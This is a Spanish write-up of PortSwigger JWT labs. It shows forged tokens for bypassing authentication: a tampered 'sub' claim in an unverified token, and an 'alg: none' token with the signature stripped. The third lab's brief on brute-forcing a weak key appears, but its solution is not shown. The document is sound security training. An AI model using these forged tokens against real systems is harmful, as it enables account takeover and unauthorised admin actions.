## Reto 1: Omisión de la autenticación JWT mediante firma no verificada

Este laboratorio utiliza un mecanismo basado en JWT para gestionar las sesiones. Debido a fallos de implementación, el servidor no verifica la firma de los JWT que recibe.

Para resolver el laboratorio, modifica tu token de sesión para obtener acceso al panel de administración en /admin, luego elimina al usuario carlos.

Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales: wiener:peter 

analizamos un fallo crítico en la implementación de tokens JWT: el servidor acepta cualquier token sin verificar su firma. Esto significa que podemos modificar el contenido del token sin necesidad de conocer la clave secreta.

Tras iniciar sesión con un usuario normal, interceptamos el JWT y cambiamos el valor del campo sub a administrator, accediendo así al panel de administración sin autenticación real. Desde allí, ejecutamos la acción de eliminar al usuario Carlos.

Este es el jwt del usuario wiener:
```shell
eyJraWQiOiJkMDA5NTlhYi04MWRjLTRhNjEtYTllMS03Y2MyMzRlOGQ1MzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzExNDA1MCwic3ViIjoid2llbmVyIn0%3d.CCK3s9fpVsgInBqlaW2bxg5XyqNP4CLtbArQa3dSKv-dgAOsmq6KsH5xKtYGBrmmuPC86XU2h_m-RLFQgTBpvO3thA6YslTUsXIj56Sjlw7VVxpCLaWQTR21MUDd0-1TRd13fEsC_a6qcLEL6xeChwnY53HaO8eRC7GqFC59Oa-K3gS3p-7rh2Ex4DYYljlCg7ZOumsaSrhTrErhnDhI_h-RsBQuBN5vXAFpW-sS_1Ohk-HPoiGDobDMypuxrCa9Le42XNTlCldk-gT1XwInNuP2K6y_QnZqn4npIoiMxovEEUdAqm1FJvqdMv6kJZ4BHSWaTshwJL9TdBqfkbGTNQ
```
descodificando el jwt obtenemos: 
```json
{"iss":"portswigger","exp":1763114050,"sub":"wiener"}
```
Modificamos el campo sub para que sea administrator:
```json
{"iss":"portswigger","exp":1763114050,"sub":"administrator"}
```

## Reto 2: Omisión de la autenticación JWT mediante verificación de firma defectuosa

Este laboratorio utiliza un mecanismo basado en JWT para gestionar las sesiones. El servidor está configurado de forma insegura para aceptar JWT sin firmar.

Para resolver el laboratorio, modifica tu token de sesión para obtener acceso al panel de administración en /admin, luego elimina al usuario carlos.

Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales: wiener:peter 

un fallo en la verificación de JWTs donde el servidor acepta tokens sin firma si el campo alg se define como none. Aprovechamos esta configuración insegura para crear un token completamente manipulado: modificamos el campo sub para suplantar al usuario administrador, establecemos el algoritmo a none y eliminamos la firma dejando sólo el encabezado y el payload separados por un punto.

A pesar de carecer de firma, el servidor acepta el token y nos da acceso al panel de administración, desde donde eliminamos al usuario Carlos.

```shell
eyJraWQiOiJkMDA5NTlhYi04MWRjLTRhNjEtYTllMS03Y2MyMzRlOGQ1MzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzExNDA1MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.CCK3s9fpVsgInBqlaW2bxg5XyqNP4CLtbArQa3dSKv-dgAOsmq6KsH5xKtYGBrmmuPC86XU2h_m-RLFQgTBpvO3thA6YslTUsXIj56Sjlw7VVxpCLaWQTR21MUDd0-1TRd13fEsC_a6qcLEL6xeChwnY53HaO8eRC7GqFC59Oa-K3gS3p-7rh2Ex4DYYljlCg7ZOumsaSrhTrErhnDhI_h-RsBQuBN5vXAFpW-sS_1Ohk-HPoiGDobDMypuxrCa9Le42XNTlCldk-gT1XwInNuP2K6y_QnZqn4npIoiMxovEEUdAqm1FJvqdMv6kJZ4BHSWaTshwJL9TdBqfkbGTNQ
```
 Cambiamos el campo alg a none y el sub a administrator, y eliminamos la firma:
```shell
eyJraWQiOiIyZWQ5MDJjYy00ZTA5LTQ0YmYtYjJlOS0yNGUxYzRkNzFlZDEiLCJhbGciOiJub25lIn0%3d.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzExNjQzNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

## Reto 3: Omisión de la autenticación JWT mediante una clave de firma débil

Este laboratorio utiliza un mecanismo basado en JWT para gestionar las sesiones. Emplea una clave secreta extremadamente débil tanto para firmar como para verificar los tokens. Esto puede ser fácilmente vulnerado mediante un ataque de fuerza bruta utilizando una lista de palabras clave comunes .

Para resolver el laboratorio, primero debes descifrar por fuerza bruta la clave secreta del sitio web. Una vez que la hayas obtenido, úsala para firmar un token de sesión modificado que te dará acceso al panel de administración en /admin, luego elimina al usuario carlos.

Puedes iniciar sesión en tu cuenta utilizando las siguientes credenciales: wiener:peter 